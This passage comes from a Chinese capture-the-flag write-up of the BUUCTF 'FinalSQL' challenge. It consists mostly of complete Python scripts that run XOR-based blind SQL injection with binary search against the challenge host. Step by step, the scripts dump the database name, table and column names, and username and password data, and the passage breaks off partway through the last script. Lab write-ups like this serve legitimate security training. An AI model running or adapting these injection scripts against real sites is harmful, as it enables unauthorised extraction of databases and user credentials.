class="hljs-string">&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br>           &#125;<br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+length(database())%3D4+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81//search.php?id=&#x27;</span><br>n = <span class="hljs-number">1</span><br><span class="hljs-comment"># 对数据库名字第n个字符进行暴力剖解</span><br><span class="hljs-comment"># payload:1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br>database_name = <span class="hljs-string">&quot;&quot;</span><br>database_lenth = <span class="hljs-number">30</span> <span class="hljs-comment"># 手动规定数据库名字长度</span><br><span class="hljs-keyword">while</span> n &lt;= database_lenth:<br>    <span class="hljs-comment"># 从可打印字符开始</span><br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 对第n个字符进行判断</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>        <span class="hljs-comment"># payload1:用于普通盲注</span><br>        <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr(database()%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(n, tmp)</span><br>        <br>        payload2 = <span class="hljs-string">&quot;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>        <span class="hljs-comment"># print(begin,end,tmp)</span><br>        <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>        <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>        <span class="hljs-comment"># print(url + payload2)</span><br>        r = requests.get(url + payload2, )<br>        <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>        true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>        <span class="hljs-comment"># print(r.text)</span><br>        <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>            <span class="hljs-comment"># 返回true界面 </span><br>            begin = tmp + <span class="hljs-number">1</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 返回flase界面</span><br>            end = tmp<br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>    <span class="hljs-built_in">print</span>(tmp)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的第%d个字符:%c&quot;</span> % (n, <span class="hljs-built_in">chr</span>(tmp)))<br>    database_name = database_name + <span class="hljs-built_in">chr</span>(tmp)<br>    <span class="hljs-comment"># 对下一个字符进行判断</span><br>    n = n + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的名字为：&quot;</span>+database_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">该数据库的名字为：geek<br></code></pre></td></tr></table></figure><p>第三步：直接爆表名，手动规定所有表名总长50:</p><p><strong>由于limit被过滤，所以直接用GROUP_CONCAT()获取所有表名</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+0%2C1)%2C1%2C1))&gt;102+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><span class="hljs-comment"># table_len存储每张表的长度</span><br>table_len = [<span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>]<br><span class="hljs-comment"># table_name存储每张表的名字</span><br>table_name = []<br><span class="hljs-comment"># index存储现在处理的是第index+1张表</span><br>index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 由于获取的是所有表名总字符串，所以只要遍历一次即可</span><br><span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">1</span>):<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># n表示当前处理的表所处理的是第n个字符</span><br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (n &lt;= table_len[index]):<br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(index, n, tmp)</span><br>            payload2 = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.get(url + payload2)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        name = name + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 存储该表的表名</span><br>    table_name.append(name)<br>    <span class="hljs-comment"># 打印该表的表名</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;&#125;张表的名字为&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">1</span>, name))<br>    <span class="hljs-comment"># 继续下一个表</span><br>    index = index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">第1张表的名字为F1naI1y,<br>[&#x27;F1naI1y,                      &#x27;]<br></code></pre></td></tr></table></figure><p>所以得到只有表:F1naI1y</p><p>第四步：直接爆表的字段名,手动规定字段名总长50，使用GROUP_CONCAT()将该张表的所有字段名组合在一起</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;users&#x27;+limit+0%2C1)%2C1%2C1))%3D117+%23</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><br><span class="hljs-comment"># table_col_num存储每张表每个字段所对应的长度</span><br>table_col_num = &#123;<span class="hljs-string">&#x27;F1naI1y第1字段的长度&#x27;</span>: <span class="hljs-number">50</span>&#125;<br><span class="hljs-comment"># table_name存储每张表的名字</span><br>table_name = [<span class="hljs-string">&#x27;F1naI1y&#x27;</span>]<br><span class="hljs-comment"># col_count存储每张表的字段数</span><br><span class="hljs-comment"># 将所有字段合在一起输出就是只有一个字段</span><br>col_count = &#123;<span class="hljs-string">&#x27;F1naI1y&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><span class="hljs-comment"># table_col_name存储每张表的字段的名字</span><br>table_col_name = &#123;&#125;<br><br>table_num = <span class="hljs-built_in">len</span>(table_name)<br>table_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先对表进行遍历,只有表F1naI1y</span><br><span class="hljs-keyword">while</span> (table_index &lt; <span class="hljs-number">1</span>):<br>    <span class="hljs-comment"># 当前表的名字:table_name[table_index]</span><br>    <span class="hljs-comment"># col_num存储当前表的字段数</span><br>    col_num = col_count[table_name[table_index]]<br>    col_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># 对当前表的字段进行遍历，获取全部字段名，所以只有一个字段</span><br>    <span class="hljs-keyword">while</span> (col_index &lt; <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># table_col_key存储当前表当前字段的key</span><br>        key = <span class="hljs-string">&quot;&#123;&#125;第&#123;&#125;字段的长度&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># col_len存储当前字段的长度</span><br>        col_len = table_col_num[key]<br>        <span class="hljs-comment"># 遍历当前字段</span><br>        col_len_index = <span class="hljs-number">0</span><br>        <span class="hljs-comment"># name存储当前字段的名称</span><br>        name = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> (col_len_index &lt; col_len):<br>            <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>            <span class="hljs-comment"># 从可打印字符开始</span><br>            begin = <span class="hljs-number">32</span><br>            end = <span class="hljs-number">126</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># 对第n个字符进行判断</span><br>            <span class="hljs-keyword">while</span> (begin &lt; end):<br>                <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>                <span class="hljs-comment"># payload1:用于普通盲注</span><br>                <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;&#123;&#125;&#x27;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(table_name[table_index], col_index, col_len_index+1, tmp)</span><br>                payload2 = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(col_len_index+<span class="hljs-number">1</span>, tmp)<br>                <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>                <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>                <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>                <span class="hljs-comment"># print(url + payload1 + str)</span><br>                r = requests.get(url + payload2)<br>                time.sleep(<span class="hljs-number">0.1</span>)<br>                <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>                true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>                <span class="hljs-comment"># print(r.text)</span><br>                <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                    <span class="hljs-comment"># 返回true界面 </span><br>                    <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                    begin = tmp + <span class="hljs-number">1</span><br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># 返回flase界面</span><br>                    end = tmp<br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>            <span class="hljs-comment"># print(tmp)</span><br>            name = name + <span class="hljs-built_in">chr</span>(tmp)<br>            <span class="hljs-comment"># 继续下一个字符</span><br>            col_len_index = col_len_index + <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 存储当前字段的名称:</span><br>        key_name = <span class="hljs-string">&quot;&#123;&#125;的第&#123;&#125;个字段的名字&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        table_col_name[key_name] = name<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(key_name, name))<br>        <span class="hljs-comment"># 继续下一个字段</span><br>        col_index = col_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一张表</span><br>    table_index = table_index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_col_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">F1naI1y的第1个字段的名字:id,username,password<br>&#123;&#x27;F1naI1y的第1个字段的名字&#x27;: &#x27;id,username,password                              &#x27;&#125;<br></code></pre></td></tr></table></figure><p>第五步：爆字段的数据:</p><p>爆username的数据:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><p>测试:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828134250862-1693214990370-12.png" alt="image-20230828134250862"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><br><span class="hljs-comment"># database_name存储数据库名字</span><br>database_name = <span class="hljs-string">&quot;geek&quot;</span><br><span class="hljs-comment"># table_name存储指定表的名字</span><br>table_name = <span class="hljs-string">&quot;F1naI1y&quot;</span><br><span class="hljs-comment"># col_name存储指定字段的名字</span><br>col_name = <span class="hljs-string">&quot;username&quot;</span><br><span class="hljs-comment"># col_data_num存储有多少列</span><br><span class="hljs-comment"># 手动指定要查看多少列数据，由于合在一起显示所以只有一列</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnum存储每个字段数据的字符个数</span><br><span class="hljs-comment"># 手动指定要查看多少字符数据</span><br>col_data_charnum = <span class="hljs-number">100</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先遍历该字段有多少列</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># data用来字段该列的数据</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            payload2 = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.get(url + payload2)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一列</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;字段第&#123;&#125;列的值:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">username字段第1列的值:mygod,welcome,site,site,site,site,Syc,finally,flag<br></code></pre></td></tr></table></figure><p>发现有一个flag,猜测flag在username&#x3D;flag所对应的字段password中</p><p>爆password字段的值，指定username&#x3D;flag</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(password)from(&#123;&#125;)where(username=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><br><span class="hljs-comment"># database_name存储数据库名字</span><br>database_name = <span class="hljs-string">&quot;geek&quot;</span><br><span class="hljs-comment"># table_name存储指定表的名字</span><br>table_name = <span class="hljs-string">&quot;F1naI1y&quot;</span><br><span class="hljs-comment"># col_name存储指定字段的名字</span><br>col_name = <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-comment"># col_data_num存储有多少列</span><br><span class="hljs-comment"># 